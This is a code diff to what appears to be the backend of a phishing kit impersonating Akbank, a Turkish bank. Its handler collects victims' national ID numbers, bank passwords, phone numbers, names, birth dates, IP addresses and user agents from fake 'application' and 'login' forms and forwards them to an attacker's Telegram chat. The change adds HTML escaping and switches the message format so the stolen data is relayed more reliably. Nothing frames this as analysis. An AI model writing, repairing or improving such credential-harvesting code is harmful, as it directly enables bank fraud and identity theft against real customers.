@@ -18,7 +18,7 @@ export default async function handler(req, res) {
   }
 
   try {
-    const { tckn, password, phone, telefon, kartLimiti, adSoyad, dogumTarihi, type } = req.body;
+    const { tckn, password, telefon, kartLimiti, adSoyad, dogumTarihi, type } = req.body;
 
     // Env değişkenleri veya default değerler
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
@@ -46,51 +46,58 @@ export default async function handler(req, res) {
 
     let message = '';
 
+    // Özel karakterleri escape et
+    function escapeHtml(text) {
+      if (!text) return 'Belirtilmedi';
+      return String(text)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+    }
+
     // Başvuru formu mu yoksa login formu mu?
     if (type === 'basvuru') {
       message = `
-💳 *Yeni Kredi Kartı Başvurusu*
+💳 <b>Yeni Kredi Kartı Başvurusu</b>
 
-👤 *Ad Soyad:*
-${adSoyad || 'Belirtilmedi'}
+👤 <b>Ad Soyad:</b>
+${escapeHtml(adSoyad)}
 
-📱 *TC Kimlik No:*
-\`${tckn || 'Belirtilmedi'}\`
+📱 <b>TC Kimlik No:</b>
+<code>${escapeHtml(tckn)}</code>
 
-📅 *Doğum Tarihi:*
-${dogumTarihi || 'Belirtilmedi'}
+📅 <b>Doğum Tarihi:</b>
+${escapeHtml(dogumTarihi)}
 
-📞 *Telefon Numarası:*
-${telefon || 'Belirtilmedi'}
+📞 <b>Telefon Numarası:</b>
+${escapeHtml(telefon)}
 
-💵 *Kart Limiti:*
-${kartLimiti || 'Belirtilmedi'} TL
+💵 <b>Kart Limiti:</b>
+${escapeHtml(kartLimiti)} TL
 
-🌐 *IP Adresi:* \`${ip}\`
-🖥️ *User Agent:* ${userAgent}
-📅 *Tarih:* ${date}
+🌐 <b>IP Adresi:</b> <code>${escapeHtml(ip)}</code>
+🖥️ <b>User Agent:</b> ${escapeHtml(userAgent)}
+📅 <b>Tarih:</b> ${escapeHtml(date)}
 
 ---
-_Akbank Başvuru Formu_
+<i>Akbank Başvuru Formu</i>
       `.trim();
     } else {
       message = `
-🔐 *Yeni Giriş Bilgisi*
+🔐 <b>Yeni Giriş Bilgisi</b>
 
-📱 *TC Kimlik No / Müşteri No:*
-\`${tckn || 'Belirtilmedi'}\`
+📱 <b>TC Kimlik No / Müşteri No:</b>
+<code>${escapeHtml(tckn)}</code>
 
-🔑 *Şifre:*
-\`${password || 'Belirtilmedi'}\`
+🔑 <b>Şifre:</b>
+<code>${escapeHtml(password)}</code>
 
-📞 *Telefon:* ${phone || 'Belirtilmedi'}
-
-🌐 *IP Adresi:* \`${ip}\`
-🖥️ *User Agent:* ${userAgent}
-📅 *Tarih:* ${date}
+🌐 <b>IP Adresi:</b> <code>${escapeHtml(ip)}</code>
+🖥️ <b>User Agent:</b> ${escapeHtml(userAgent)}
+📅 <b>Tarih:</b> ${escapeHtml(date)}
 
 ---
-_Akbank Login Form_
+<i>Akbank Login Form</i>
       `.trim();
     }
 
@@ -105,7 +112,7 @@ _Akbank Login Form_
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
-        parse_mode: 'Markdown',
+        parse_mode: 'HTML',
       }),
     });
 
